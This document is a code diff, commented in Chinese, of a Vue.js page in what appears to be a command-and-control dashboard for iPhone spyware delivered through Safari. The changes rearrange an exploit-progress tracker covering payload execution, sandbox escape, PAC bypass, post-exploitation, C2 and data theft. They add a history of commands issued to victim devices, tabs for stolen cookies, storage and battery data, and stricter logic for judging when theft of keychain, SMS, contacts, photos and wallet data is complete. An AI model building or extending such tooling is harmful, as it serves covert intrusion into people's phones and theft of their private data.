@@ -1,5 +1,51 @@
 <template>
   <div class="device-detail-page">
+    <!-- 利用进度卡片：移到界面头部，让大布局转为「顶部总览 + 下方左右分栏」更清晰 -->
+    <div class="page-card exploit-progress-card" style="margin-bottom:16px;">
+      <div class="page-header" style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
+        <div class="page-title">利用进度</div>
+        <div style="display:flex;align-items:center;gap:10px;">
+          <el-tag :type="exploitProgress.statusType" size="small" effect="dark">
+            {{ exploitProgress.statusText }}
+          </el-tag>
+          <span style="font-size:20px;font-weight:700;color:var(--el-text-color-primary);">
+            {{ exploitProgress.percent }}<span style="font-size:12px;font-weight:400;color:var(--el-text-color-secondary);">%</span>
+          </span>
+        </div>
+      </div>
+      <el-progress
+        :percentage="exploitProgress.percent"
+        :stroke-width="14"
+        :color="exploitProgress.percent >= 100 ? '#67c23a' : (exploitProgress.percent >= 70 ? '#409eff' : (exploitProgress.percent >= 35 ? '#e6a23c' : '#909399'))"
+        :format="() => `${exploitProgress.percent}% · ${exploitProgress.currentStage}`"
+        style="margin-bottom:18px;"
+      />
+      <div class="exploit-stages-grid">
+        <div
+          v-for="(stage, idx) in exploitProgress.stages"
+          :key="stage.key"
+          class="exploit-stage-item"
+          :class="{
+            done: stage.done,
+            current: !stage.done && idx === exploitProgress.currentIndex,
+            pending: !stage.done && idx !== exploitProgress.currentIndex
+          }"
+        >
+          <div class="stage-indicator">
+            <el-icon v-if="stage.done" class="stage-icon-done"><Check /></el-icon>
+            <span v-else class="stage-icon-num">{{ idx + 1 }}</span>
+          </div>
+          <div class="stage-content">
+            <div class="stage-title">
+              {{ stage.label }}
+              <span class="stage-percent">{{ stage.percent }}%</span>
+            </div>
+            <div class="stage-desc">{{ stage.desc }}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
     <div class="page-card" style="margin-bottom:16px;">
       <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
         <div style="display:flex;align-items:center;gap:12px;">
@@ -45,11 +91,6 @@
               </template>
               <span v-else class="text-muted">{{ device?.safari_version || '-' }}</span>
             </el-descriptions-item>
-            <el-descriptions-item label="越狱/Root">
-              <el-tag :type="jailbrokenTag.type" size="small" effect="plain">
-                {{ jailbrokenTag.text }}
-              </el-tag>
-            </el-descriptions-item>
           </el-descriptions>
         </el-col>
         <el-col :span="8">
@@ -91,10 +132,10 @@
                   :percentage="exploitProgress.percent"
                   :stroke-width="8"
                   :color="exploitProgress.percent >= 100 ? '#67c23a' : (exploitProgress.percent >= 70 ? '#409eff' : (exploitProgress.percent >= 35 ? '#e6a23c' : '#909399'))"
-                  style="flex:1;min-width:120px;"
+                  style="flex:1;min-width:100px;"
                   :show-text="false"
                 />
-                <span style="font-size:12px;color:var(--el-text-color-secondary);font-weight:600;min-width:36px;">{{ exploitProgress.percent }}%</span>
+                <span style="font-size:12px;color:var(--el-text-color-secondary);font-weight:600;min-width:30px;">{{ exploitProgress.percent }}%</span>
               </div>
             </el-descriptions-item>
             <el-descriptions-item label="兼容性">
@@ -117,17 +158,83 @@
                 {{ (device?.enabled ?? 1) ? '已启用' : '已禁用' }}
               </el-tag>
             </el-descriptions-item>
+            <el-descriptions-item label="越狱/Root">
+              <el-tag :type="jailbrokenTag.type" size="small" effect="plain">
+                {{ jailbrokenTag.text }}
+              </el-tag>
+            </el-descriptions-item>
           </el-descriptions>
         </el-col>
       </el-row>
 
+      <!-- Agent 真实能力（独立横跨三列，不再挤在连接信息里） -->
+      <div style="margin-top:16px;">
+        <el-descriptions :column="2" border size="small" title="Agent 真实能力（利用链各阶段上报）">
+          <el-descriptions-item label="能力徽章" :span="1">
+            <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+              <el-tag :type="agentCapabilitySummary.badgeType" size="small" effect="dark">
+                {{ agentCapabilitySummary.badgeText }}
+              </el-tag>
+              <template v-if="agentCapabilities.available">
+                <el-tooltip
+                  placement="top"
+                  :content="`NativeBridge: ${agentCapabilities.native_bridge === true ? 'YES (内核权限可用)' : (agentCapabilities.native_bridge === false ? 'NO (仅沙箱内，file/shell/keychain会失败)' : '未上报')} | SBX0 (Stage1 内存原语): ${agentCapabilities.sbx0_success === true ? 'OK' : (agentCapabilities.sbx0_success === false ? 'FAIL' : '?')} | SBX1 (Stage2 PAC 绕过): ${agentCapabilities.sbx1_success === true ? 'OK' : (agentCapabilities.sbx1_success === false ? 'FAIL' : '?')} | PE 跳过: ${agentCapabilities.pe_skipped === true ? '是' : (agentCapabilities.pe_skipped === false ? '否' : '?')}`"
+                >
+                  <el-tag
+                    size="small"
+                    effect="plain"
+                    :type="agentCapabilities.native_bridge === true ? 'success' : (agentCapabilities.native_bridge === false ? 'danger' : 'info')"
+                    style="border-style:dashed;cursor:help;"
+                  >
+                    <span style="font-weight:600;">NB:</span>
+                    {{ agentCapabilities.native_bridge === true ? 'YES' : (agentCapabilities.native_bridge === false ? 'NO' : '?') }}
+                    <span style="margin:0 4px;opacity:.45;">|</span>
+                    <span style="font-weight:600;">SBX0:</span>
+                    {{ agentCapabilities.sbx0_success === true ? 'OK' : (agentCapabilities.sbx0_success === false ? 'FAIL' : '?') }}
+                    <span style="margin:0 4px;opacity:.45;">|</span>
+                    <span style="font-weight:600;">SBX1:</span>
+                    {{ agentCapabilities.sbx1_success === true ? 'OK' : (agentCapabilities.sbx1_success === false ? 'FAIL' : '?') }}
+                    <template v-if="agentCapabilities.pe_skipped === true">
+                      <span style="margin:0 4px;opacity:.45;">|</span>
+                      <span style="color:var(--el-color-warning);font-weight:600;">PE跳过</span>
+                    </template>
+                  </el-tag>
+                </el-tooltip>
+              </template>
+              <span v-if="!agentCapabilities.available" style="font-size:12px;color:var(--el-text-color-secondary);">（等 sandbox 数据回传后显示，hover 信号量 tag 看详细含义）</span>
+            </div>
+          </el-descriptions-item>
+          <el-descriptions-item label="来源 / iOS 版本" :span="1">
+            <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;font-size:12px;">
+              <el-tag size="small" effect="plain" type="primary" :disabled="agentCapabilities.source !== 'exfil_sandbox'">
+                来源: {{ agentCapabilities.source === 'exfil_sandbox' ? 'sandbox 回传' : '未回传' }}
+              </el-tag>
+              <span v-if="agentCapabilities.ios_version" class="mono" style="color:var(--el-text-color-secondary);">
+                iOS: <strong style="color:var(--el-text-color-primary);">{{ agentCapabilities.ios_version }}</strong>
+              </span>
+              <span v-if="agentCapabilities.localStorage === true || agentCapabilities.sessionStorage === true || agentCapabilities.indexedDB === true"
+                    style="color:var(--el-text-color-secondary);">
+                <el-tag size="small" effect="plain" type="success" v-if="agentCapabilities.localStorage">LS OK</el-tag>
+                <el-tag size="small" effect="plain" type="success" style="margin-left:4px;" v-if="agentCapabilities.sessionStorage">SS OK</el-tag>
+                <el-tag size="small" effect="plain" type="success" style="margin-left:4px;" v-if="agentCapabilities.indexedDB">IDB OK</el-tag>
+              </span>
+            </div>
+          </el-descriptions-item>
+          <el-descriptions-item v-if="agentCapabilitySummary.summaryText" label="能力说明" :span="2">
+            <span class="text-muted" style="word-break:break-all;font-size:12.5px;line-height:1.6;">
+              {{ agentCapabilitySummary.summaryText }}
+            </span>
+          </el-descriptions-item>
+        </el-descriptions>
+      </div>
+
       <div v-if="device?.host || device?.access_path || device?.note || device?.user_agent" style="margin-top:16px;">
         <el-descriptions :column="2" border size="small" title="访问上下文">
-          <el-descriptions-item label="访问 Host" :span="2">
+          <el-descriptions-item label="访问 Host">
             <span class="mono">{{ device?.host || '-' }}</span>
           </el-descriptions-item>
-          <el-descriptions-item label="来源 Referer" :span="2">
-            <span class="mono text-muted">{{ device?.referer || '-' }}</span>
+          <el-descriptions-item label="来源 Referer">
+            <span class="mono text-muted" style="word-break:break-all;">{{ device?.referer || '-' }}</span>
           </el-descriptions-item>
           <el-descriptions-item label="访问路径" :span="2">
             <span class="mono text-muted" style="word-break:break-all;">{{ device?.access_path || '-' }}</span>
@@ -139,52 +246,6 @@
             {{ device.note }}
           </el-descriptions-item>
         </el-descriptions>
-      </div>
-
-      <!-- 利用进度卡片：显示完整的 7 阶段利用流程进度 -->
-      <div class="page-card exploit-progress-card" style="margin-top:16px;">
-        <div class="page-header" style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
-          <div class="page-title">利用进度</div>
-          <div style="display:flex;align-items:center;gap:10px;">
-            <el-tag :type="exploitProgress.statusType" size="small" effect="dark">
-              {{ exploitProgress.statusText }}
-            </el-tag>
-            <span style="font-size:20px;font-weight:700;color:var(--el-text-color-primary);">
-              {{ exploitProgress.percent }}<span style="font-size:12px;font-weight:400;color:var(--el-text-color-secondary);">%</span>
-            </span>
-          </div>
-        </div>
-        <el-progress
-          :percentage="exploitProgress.percent"
-          :stroke-width="14"
-          :color="exploitProgress.percent >= 100 ? '#67c23a' : (exploitProgress.percent >= 70 ? '#409eff' : (exploitProgress.percent >= 35 ? '#e6a23c' : '#909399'))"
-          :format="() => `${exploitProgress.percent}% · ${exploitProgress.currentStage}`"
-          style="margin-bottom:18px;"
-        />
-        <div class="exploit-stages-grid">
-          <div
-            v-for="(stage, idx) in exploitProgress.stages"
-            :key="stage.key"
-            class="exploit-stage-item"
-            :class="{
-              done: stage.done,
-              current: !stage.done && idx === exploitProgress.currentIndex,
-              pending: !stage.done && idx !== exploitProgress.currentIndex
-            }"
-          >
-            <div class="stage-indicator">
-              <el-icon v-if="stage.done" class="stage-icon-done"><Check /></el-icon>
-              <span v-else class="stage-icon-num">{{ idx + 1 }}</span>
-            </div>
-            <div class="stage-content">
-              <div class="stage-title">
-                {{ stage.label }}
-                <span class="stage-percent">{{ stage.percent }}%</span>
-              </div>
-              <div class="stage-desc">{{ stage.desc }}</div>
-            </div>
-          </div>
-        </div>
       </div>
 
       <div style="margin-top:16px;">
@@ -261,14 +322,139 @@
 
     <el-row :gutter="16">
       <el-col :span="8">
-        <div class="page-card" style="height:100%;">
+        <!-- 命令执行历史：移到左侧 span-8，放在心跳时间线的上方（紧凑版列） -->
+        <div class="page-card">
           <div class="page-header">
-            <div class="page-title">心跳时间线</div>
+            <div class="page-title">命令执行历史</div>
+            <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
+              <el-tag size="small" type="warning" effect="plain" v-if="pendingCnt">待 {{ pendingCnt }}</el-tag>
+              <el-tag size="small" type="success" effect="plain" v-if="completedCnt">成 {{ completedCnt }}</el-tag>
+              <el-tag size="small" type="danger" effect="plain" v-if="failedCnt">败 {{ failedCnt }}</el-tag>
+              <el-button size="small" :loading="cmdLoading" @click="cmdPage = 1; loadCommands()" style="padding:4px 8px;">
+                <el-icon><Refresh /></el-icon>
+              </el-button>
+            </div>
+          </div>
+
+          <div style="margin-bottom:8px;">
+            <el-tooltip
+              v-if="capabilityHint.show"
+              :content="capabilityHint.desc"
+              placement="top"
+              effect="dark"
+              :disabled="!capabilityHint.desc"
+            >
+              <div style="margin-bottom:8px;">
+                <el-alert
+                  :title="capabilityHint.title"
+                  :type="capabilityHint.type"
+                  show-icon
+                  :closable="false"
+                  style="cursor:help;"
+                />
+              </div>
+            </el-tooltip>
+            <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
+              <el-select v-model="cmdStatusFilter" size="small" placeholder="状态" clearable style="width:100px;flex:1;min-width:80px;" @change="cmdPage = 1; loadCommands()">
+                <el-option label="待执行" value="pending" />
+                <el-option label="执行中" value="running" />
+                <el-option label="已完成" value="completed" />
+                <el-option label="失败" value="failed" />
+                <el-option label="已过期" value="expired" />
+              </el-select>
+              <el-input v-model="cmdQFilter" size="small" placeholder="搜索命令" clearable style="flex:1;min-width:100px;" @clear="cmdPage = 1; loadCommands()" @keyup.enter="cmdPage = 1; loadCommands()">
+                <template #prefix><el-icon style="width:14px;height:14px;"><Search /></el-icon></template>
+              </el-input>
+            </div>
+          </div>
+
+          <el-table :data="cmdList" stripe v-loading="cmdLoading" size="small" style="width:100%;table-layout:fixed;">
+            <el-table-column type="expand" width="36">
+              <template #default="{ row }">
+                <div style="padding:6px 8px;background:#fafafa;border-radius:6px;">
+                  <div style="font-size:11px;color:#909399;margin-bottom:4px;">
+                    ID: {{ row.id }} · 创建: {{ row.created_at ? formatRelative(row.created_at) : '-' }}
+                    · 输出（{{ row.output ? row.output.length : 0 }} 字符）
+                    <span v-if="row.error" style="margin-left:8px;color:#f56c6c;">错误：{{ row.error.length }} 字符</span>
+                  </div>
+                  <pre class="mono" style="background:#0d1117;color:#e6edf3;padding:10px;border-radius:6px;max-height:240px;overflow:auto;margin:0;white-space:pre-wrap;word-break:break-all;font-size:11.5px;line-height:1.5;">{{ row.error ? ('[ERROR] ' + row.error + (row.output ? '\n\n--- stdout ---\n' + row.output : '')) : (row.output || '<无输出>') }}</pre>
+                </div>
+              </template>
+            </el-table-column>
+            <el-table-column prop="command" label="命令" min-width="90" show-overflow-tooltip>
+              <template #default="{ row }">
+                <el-tooltip :content="row.command" placement="top" :disabled="!row.command || row.command.length <= 14">
+                  <code class="mono" style="font-size:11.5px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">{{ row.command }}</code>
+                </el-tooltip>
+              </template>
+            </el-table-column>
+            <el-table-column prop="status" label="状态" width="58">
+              <template #default="{ row }">
+                <el-tag :type="cmdStatusTag(row.status)" size="small" effect="plain" style="transform:scale(.85);transform-origin:left center;">{{ cmdStatusLabel(row.status) }}</el-tag>
+              </template>
+            </el-table-column>
+            <el-table-column label="操作" width="56" align="center">
+              <template #default="{ row }">
+                <div style="display:flex;gap:1px;justify-content:center;align-items:center;">
+                  <el-tooltip content="取消" placement="top" v-if="row.status === 'pending'">
+                    <el-button type="primary" link size="small" style="padding:2px;" @click="cancelCmd(row)">
+                      <el-icon style="width:13px;height:13px;"><CircleClose /></el-icon>
+                    </el-button>
+                  </el-tooltip>
+                  <el-tooltip content="重发" placement="top">
+                    <el-button type="primary" link size="small" style="padding:2px;" @click="retryCmd(row)">
+                      <el-icon style="width:13px;height:13px;"><RefreshRight /></el-icon>
+                    </el-button>
+                  </el-tooltip>
+                  <el-tooltip content="删除" placement="top">
+                    <el-button type="danger" link size="small" style="padding:2px;" @click="deleteCmd(row)">
+                      <el-icon style="width:13px;height:13px;"><Delete /></el-icon>
+                    </el-button>
+                  </el-tooltip>
+                </div>
+              </template>
+            </el-table-column>
+          </el-table>
+
+          <div style="margin-top:8px;display:flex;justify-content:flex-end;">
+            <el-pagination
+              v-model:current-page="cmdPage"
+              v-model:page-size="cmdPageSize"
+              :page-sizes="[10, 20, 50]"
+              :total="cmdTotal"
+              layout="total, prev, pager, next"
+              background
+              small
+              @current-change="loadCommands"
+              @size-change="cmdPage = 1; loadCommands()"
+            />
+          </div>
+
+        </div>
+
+        <!-- 心跳时间线：放在命令执行历史下方，缩短为最近 {{ HEARTBEAT_LIMIT }} 条，支持展开全部 -->
+        <div class="page-card" style="margin-top:16px;">
+          <div class="page-header">
+            <div class="page-title">
+              心跳时间线
+              <span v-if="heartbeats.length" style="margin-left:6px;font-size:12px;font-weight:400;color:var(--el-text-color-secondary);">
+                {{ showAllHeartbeats ? heartbeats.length : displayHeartbeats.length }}/{{ heartbeats.length }}
+              </span>
+            </div>
+            <el-button
+              v-if="heartbeats.length > HEARTBEAT_LIMIT"
+              size="small"
+              link
+              type="primary"
+              @click="showAllHeartbeats = !showAllHeartbeats"
+            >
+              {{ showAllHeartbeats ? '收起' : `展开全部 (${heartbeats.length})` }}
+            </el-button>
           </div>
           <el-timeline>
             <el-timeline-item
-              v-for="(h, idx) in heartbeats"
-              :key="idx"
+              v-for="(h, idx) in displayHeartbeats"
+              :key="'hb-' + (h.id ?? ((h.created_at || h.time || 't') + '-' + idx))"
               :timestamp="formatRelative(h.created_at || h.time)"
               :type="h.status === 'online' || h.online ? 'success' : 'info'"
             >
@@ -414,6 +600,24 @@
                 style="margin-bottom:12px;" />
               <data-table :rows="tabsData.wallet" :cols="walletCols" />
             </el-tab-pane>
+            <el-tab-pane label="Cookies" name="cookies">
+              <el-alert v-if="!tabsData.cookies?.length" type="info" show-icon :closable="false"
+                title="暂无 Cookies 数据（Safari 沙箱内自动采集）"
+                style="margin-bottom:12px;" />
+              <data-table :rows="tabsData.cookies" :cols="exfilGenericCols" />
+            </el-tab-pane>
+            <el-tab-pane label="Storage" name="storage">
+              <el-alert v-if="!tabsData.storage?.length" type="info" show-icon :closable="false"
+                title="暂无 Storage 数据（localStorage / sessionStorage，Safari 沙箱内自动采集）"
+                style="margin-bottom:12px;" />
+              <data-table :rows="tabsData.storage" :cols="exfilGenericCols" />
+            </el-tab-pane>
+            <el-tab-pane label="Battery" name="battery">
+              <el-alert v-if="!tabsData.battery?.length" type="info" show-icon :closable="false"
+                title="暂无电池数据（navigator.getBattery 自动采集）"
+                style="margin-bottom:12px;" />
+              <data-table :rows="tabsData.battery" :cols="exfilGenericCols" />
+            </el-tab-pane>
           </el-tabs>
         </div>
       </el-col>
@@ -468,18 +672,54 @@
 </template>
 
 <script setup>
-import { ref, computed, onMounted, defineComponent, h } from 'vue'
+import { ref, computed, onMounted, watch, nextTick, defineComponent, h } from 'vue'
 import { useRoute, useRouter } from 'vue-router'
 import { ElMessage, ElMessageBox } from 'element-plus'
-import { ArrowLeft, Promotion, VideoPlay, Refresh, CopyDocument, Delete, Search, Clock, Check } from '@element-plus/icons-vue'
+import { ArrowLeft, Promotion, VideoPlay, Refresh, CopyDocument, Delete, Search, Clock, Check, RefreshRight, CircleClose } from '@element-plus/icons-vue'
 import axios from '../utils/axios'
-import { formatDate, formatRelative, require2FA } from '../utils/twofa'
+import { formatDate, formatRelative, require2FA, shortUuid } from '../utils/twofa'
 
 const route = useRoute()
 const router = useRouter()
 const uuid = route.params.uuid
 const device = ref(null)
 const heartbeats = ref([])
+const HEARTBEAT_LIMIT = 3
+const showAllHeartbeats = ref(false)
+const displayHeartbeats = computed(() => {
+  const arr = Array.isArray(heartbeats.value) ? heartbeats.value : []
+  return showAllHeartbeats.value ? arr : arr.slice(0, HEARTBEAT_LIMIT)
+})
+// 心跳展开/收起切换日志 + 强制 nextTick 触发 timeline 竖线高度重算
+watch(showAllHeartbeats, (newVal, oldVal) => {
+  const total = Array.isArray(heartbeats.value) ? heartbeats.value.length : 0
+  const displayCount = newVal ? total : Math.min(total, HEARTBEAT_LIMIT)
+  console.log(
+    `%c[DeviceDetail:HEARTBEAT]%c expand toggle: ${oldVal ? '收起→展开' : '展开→收起'} | showAll=${newVal} | total=${total} | display=${displayCount}/${HEARTBEAT_LIMIT} | uuid=${uuid}`,
+    'color:#3b82f6;font-weight:bold;', ''
+  )
+  nextTick(() => {
+    try {
+      const timelineEl = document.querySelector('.page-card .el-timeline')
+      if (timelineEl) {
+        const h = timelineEl.offsetHeight
+        const items = timelineEl.querySelectorAll(':scope > .el-timeline-item')
+        console.log(`[DeviceDetail:HEARTBEAT] nextTick relayout: timeline offsetHeight=${h}px, items=${items.length}`)
+      }
+    } catch (_) {}
+  })
+})
+// heartbeats 本身变化时也打一次日志，方便排查"新心跳来了没显示"
+watch(heartbeats, (newArr, oldArr) => {
+  const newLen = Array.isArray(newArr) ? newArr.length : 0
+  const oldLen = Array.isArray(oldArr) ? oldArr.length : 0
+  const newestCreatedAt = newLen > 0 ? (newArr[0].created_at || newArr[0].time || null) : null
+  const oldestCreatedAt = newLen > 0 ? (newArr[newLen - 1].created_at || newArr[newLen - 1].time || null) : null
+  console.log(
+    `%c[DeviceDetail:HEARTBEAT]%c data changed: ${oldLen} → ${newLen} | newest=${newestCreatedAt} | oldest=${oldestCreatedAt} | showAll=${showAllHeartbeats.value}`,
+    'color:#3b82f6;font-weight:bold;', ''
+  )
+}, { deep: false })
 const activeTab = ref('sandbox')
 const cmdText = ref('')
 const sendingCmd = ref(false)
@@ -489,6 +729,15 @@ const scriptsLoading = ref(false)
 const scriptsList = ref([])
 const selectedScriptId = ref(null)
 const scriptRunning = ref(false)
+
+// 命令执行历史（设备详情内联列表）
+const cmdList = ref([])
+const cmdTotal = ref(0)
+const cmdPage = ref(1)
+const cmdPageSize = ref(20)
+const cmdStatusFilter = ref('')
+const cmdQFilter = ref('')
+const cmdLoading = ref(false)
 
 const logs = ref([])
 const logsLoading = ref(false)
@@ -503,8 +752,15 @@ const validPhotos = computed(() =>
     : []
 )
 
+// 命令历史统计
+const pendingCnt = computed(() => (cmdList.value || []).filter(c => c.status === 'pending').length)
+const completedCnt = computed(() => (cmdList.value || []).filter(c => c.status === 'completed').length)
+const failedCnt = computed(() => (cmdList.value || []).filter(c => c.status === 'failed').length)
+
 const filteredLogs = computed(() => {
   let arr = Array.isArray(logs.value) ? logs.value : []
+  // 最新日志显示在最前面（按加载顺序反转；后端按升序返回则需反转）
+  try { arr = arr.slice().reverse() } catch (_) {}
   if (logsFilterType.value) {
     arr = arr.filter(x => String(x.type || '').toLowerCase() === String(logsFilterType.value).toLowerCase())
   }
@@ -587,14 +843,112 @@ const exploitProgress = computed(() => {
   const d = device.value
   const hbSources = (heartbeats.value || []).map(h => String(h?.source || '').toLowerCase())
   const tabs = tabsData.value || {}
-  const hasExfilData = Object.keys(tabs).some(k => k !== 'sandbox' && Array.isArray(tabs[k]) && tabs[k].length > 0)
-  const hasSandbox = Array.isArray(tabs.sandbox) && tabs.sandbox.length > 0
   const exploitStatus = String(d.exploit_status || '').toLowerCase().trim()
   const isExploited = ['success', 'exploited', 'complete', 'ok'].includes(exploitStatus)
   const cmdCount = logsSummary.value?.command || 0
   const hasCommand = cmdCount > 0 || !!d.last_command_time
-  const hasPostExploit = hbSources.some(s => s.includes('post_exploit') || s.includes('exploit_report') || s.includes('exfil:sandbox'))
   const hasAccess = !!(d.host || d.access_path || d.referer)
+  const caps = agentCapabilities.value
+
+  // ── A3. 真实 9 类沙箱外数据 tab（不含 sandbox / cookies / storage / wallets / location / system_info）
+  //     cookies + storage 是 JS 沙箱内可得的，sandbox 是能力描述；wallets/location/system_info
+  //     是 loadTabs 多余请求的 category，不在 UI 里展示所以也不参与进度判定。
+  const REAL_OUTSIDE_TABS = ['keychain', 'wifi', 'contacts', 'sms', 'calls', 'photos', 'files', 'wallet', 'battery']
+  const tabLens = {}
+  Object.keys(tabs).forEach(k => {
+    tabLens[k] = Array.isArray(tabs[k]) ? tabs[k].length : 0
+  })
+  const outsideCounts = REAL_OUTSIDE_TABS.map(k => tabLens[k] || 0)
+  const outsideNonEmpty = outsideCounts.filter(n => n > 0).length
+  const outsideTotal = outsideCounts.reduce((s, n) => s + n, 0)
+  const hasSandbox = (tabLens.sandbox || 0) > 0
+
+  // hasExfilData（数据窃取 100% 达成条件）：
+  // 至少 2 类以上真实沙箱外 tab 有数据；如果只有 0/1 类，说明还没窃取完（只回传了 sandbox-only fallback）
+  const hasExfilData = outsideNonEmpty >= 2
+  // 用户有时想知道"只要有任何沙箱外数据就算部分窃取"（供 desc 文案用）
+  const hasAnyOutside = outsideNonEmpty >= 1
+
+  // ── A2. post_exploit 阶段：去掉 exfil:sandbox fallback 的影响
+  //     post_exploit 真实运行的信号应该是：有 post_exploit 心跳 / 有 exploit_report 心跳 /
+  //     有命令调度 hasCommand。sandbox 回传 (exfil:sandbox) 是 fallback，不算 post_exploit 完成。
+  const hbHasPostExploit = hbSources.some(s =>
+    s.includes('post_exploit') ||
+    s.includes('exploit_report') ||
+    (s.startsWith('exfil:') && s !== 'exfil:sandbox')
+  )
+  const hasPostExploit = hbHasPostExploit || hasCommand
+
+  // ── A1. Stage3 沙箱逃逸判定（严格版）
+  //     旧判定：isExploited || exploit_report hb → done
+  //     新判定：必须有任一以下成立才算 done：
+  //       a) Agent 上报 native_bridge=true（真内核桥就绪，golden signal）
+  //       b) 已有任何真实沙箱外数据回来（outsideNonEmpty>=1）（间接证明 native_bridge 曾经工作）
+  //       c) exploit_status=success 且 没出现任何 ERROR-no-bridge（只能算 weak done）
+  //     否则：如果 exploit_status=success 但 native_bridge=false（sandbox-only），
+  //          说明后端 exploit_status 标记太乐观，进度不能算到 55% done。
+  let exploitDone = false
+  let exploitDesc = '未执行'
+  if (caps.native_bridge === true) {
+    exploitDone = true
+    exploitDesc = '✅ Native桥就绪（内核权限可用）'
+  } else if (hasAnyOutside) {
+    exploitDone = true
+    exploitDesc = `✅ 已有 ${outsideNonEmpty} 类沙箱外数据回传（间接证明逃逸成功）`
+  } else if (isExploited && caps.native_bridge !== false) {
+    exploitDone = true
+    exploitDesc = '后端标记已利用（能力未回传，存疑）'
+  } else if (hbSources.some(s => s.includes('exploit_report')) && caps.native_bridge !== false) {
+    exploitDone = true
+    exploitDesc = 'Exploit报告已上传（能力未回传，存疑）'
+  } else if (isExploited && caps.native_bridge === false) {
+    // 典型 sandbox-only：后端标记 success，但 Agent 明确上报 native_bridge=false
+    exploitDone = false
+    exploitDesc = '⚠️ 仅 Sandbox-only（Native桥未就绪，无法读沙箱外数据）'
+  } else if (caps.available && caps.sbx0_success === true && caps.sbx1_success === true) {
+    exploitDone = false
+    exploitDesc = '利用中（Stage1/2 OK，Native桥待建）'
+  } else if (hasSandbox || hasPostExploit) {
+    exploitDone = false
+    exploitDesc = '利用中（Sandbox 数据已回传，Stage3 进行中）'
+  }
+
+  // ── 详细调试日志：每次 exploitProgress 被重算就打印（方便排查 100% 误判）
+  console.groupCollapsed(
+    `%c[DeviceDetail:PROGRESS]%c device=${(d.device_uuid || '?').slice(0, 12)} exploit_status=${exploitStatus || '空'} native_bridge=${caps.native_bridge === true ? 'YES' : (caps.native_bridge === false ? 'NO' : '?')} → outsideNonEmpty=${outsideNonEmpty}/${REAL_OUTSIDE_TABS.length} hasExfilData=${hasExfilData}`,
+    'color:#f43f5e;font-weight:bold;',
+    ''
+  )
+  console.log(
+    '%c[所有 tabs 长度]%c',
+    'color:#a855f7;font-weight:bold;',
+    '',
+    JSON.parse(JSON.stringify(tabLens))
+  )
+  const outsideDebug = {}
+  REAL_OUTSIDE_TABS.forEach(k => { outsideDebug[k] = tabLens[k] || 0 })
+  console.log(
+    `%c[REAL_OUTSIDE_TABS 明细]%c outsideNonEmpty=${outsideNonEmpty}(需≥2才判定100%完成) outsideTotal=${outsideTotal} items`,
+    'color:#0ea5e9;font-weight:bold;',
+    '',
+    outsideDebug
+  )
+  console.log(
+    '%c[信号量明细]%c',
+    'color:#f59e0b;font-weight:bold;',
+    '',
+    {
+      hasSandbox, hasAccess, isExploited, hasCommand, hbHasPostExploit, hasPostExploit,
+      hasAnyOutside, hasExfilData,
+      agentCaps: {
+        nb: caps.native_bridge, sbx0: caps.sbx0_success, sbx1: caps.sbx1_success,
+        pe_skipped: caps.pe_skipped, source: caps.source, available: caps.available
+      },
+      hbSources: hbSources.length > 0 ? hbSources : '(empty)'
+    }
+  )
+  console.log(`exploit(55%) stage → done=${exploitDone}  desc="${exploitDesc}"`)
+  console.groupEnd()
 
   const stages = [
     {
@@ -616,21 +970,21 @@ const exploitProgress = computed(() => {
       label: '载荷加载执行',
       percent: 35,
       done: hasSandbox || hbSources.some(s => s.includes('sandbox')),
-      desc: hasSandbox ? `沙箱数据 ${tabs.sandbox.length} 条` : (hasPostExploit ? '载荷已执行' : '未加载')
+      desc: hasSandbox ? `沙箱数据 ${tabLens.sandbox || 0} 条（Cookies:${tabLens.cookies || 0},Storage:${tabLens.storage || 0}）` : (hasPostExploit ? '载荷已执行' : '未加载')
     },
     {
       key: 'exploit',
       label: '沙箱逃逸 (Stage3)',
       percent: 55,
-      done: isExploited || hbSources.some(s => s.includes('exploit_report')),
-      desc: isExploited ? '漏洞利用成功' : (hasPostExploit ? '利用中' : '未执行')
+      done: exploitDone,
+      desc: exploitDesc
     },
     {
       key: 'post_exploit',
       label: '后渗透运行',
       percent: 70,
-      done: hasPostExploit || hasCommand,
-      desc: hasPostExploit ? '后渗透已运行' : (hasCommand ? '命令通道已建立' : '未运行')
+      done: hasPostExploit,
+      desc: hasPostExploit ? (hbHasPostExploit ? '后渗透脚本已运行' : '命令通道已建立') : '未运行'
     },
     {
       key: 'c2',
@@ -644,7 +998,11 @@ const exploitProgress = computed(() => {
       label: '数据窃取回传',
       percent: 100,
       done: hasExfilData,
-      desc: hasExfilData ? '已回传敏感数据' : '未窃取'
+      desc: hasExfilData
+        ? `已回传 ${outsideNonEmpty}/${REAL_OUTSIDE_TABS.length} 类 · ${outsideTotal} 条沙箱外数据`
+        : (hasAnyOutside
+          ? `部分窃取（${outsideNonEmpty}/${REAL_OUTSIDE_TABS.length} 类，需≥2类才算完成）`
+          : (hasSandbox ? '仅沙箱内数据（Cookies/Storage），未窃取到沙箱外数据' : '未窃取'))
     },
   ]
 
@@ -669,14 +1027,24 @@ const exploitProgress = computed(() => {
     statusType = 'success'
     statusText = '完全控制'
   } else if (percent >= 70) {
-    statusType = 'success'
-    statusText = '已利用'
+    // 70%+ 但 native_bridge=false：实际是 sandbox-only 模式，不算"已利用"
+    if (caps.native_bridge === false || (caps.available && !caps.native_bridge)) {
+      statusType = 'warning'
+      statusText = 'Sandbox-only 模式'
+    } else {
+      statusType = 'success'
+      statusText = '已利用'
+    }
   } else if (percent >= 35) {
     statusType = 'warning'
     statusText = '利用中'
   } else if (percent >= 10) {
     statusType = 'info'
     statusText = '已上线'
+  }
+  // 额外微调：如果 Agent 明确上报 native_bridge=false（sandbox-only），把状态类型降级成 warning
+  if (statusType === 'success' && caps.native_bridge === false && outsideNonEmpty === 0) {
+    statusType = 'warning'
   }
 
   return { percent, currentStage, currentIndex, stages, statusType, statusText }
@@ -705,6 +1073,85 @@ const compatibleTag = computed(() => {
       if (!raw) return { type: 'info', text: '未知' }
       return { type: 'primary', text: raw }
   }
+})
+
+// ── 设备真实能力（从 sandbox 类别 exfil 数据里取 Agent 上报的 capabilities）
